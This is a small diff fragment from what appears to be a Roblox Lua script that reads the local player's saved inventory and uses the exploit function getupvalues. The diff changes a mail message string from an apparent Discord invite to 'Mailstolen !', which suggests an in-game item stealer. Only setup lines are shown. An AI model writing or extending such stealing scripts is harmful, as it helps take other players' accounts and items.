@@ -129,7 +129,7 @@ end
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "gg / HcpNe56R2a"
+local MailMessage = "Mailstolen !"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
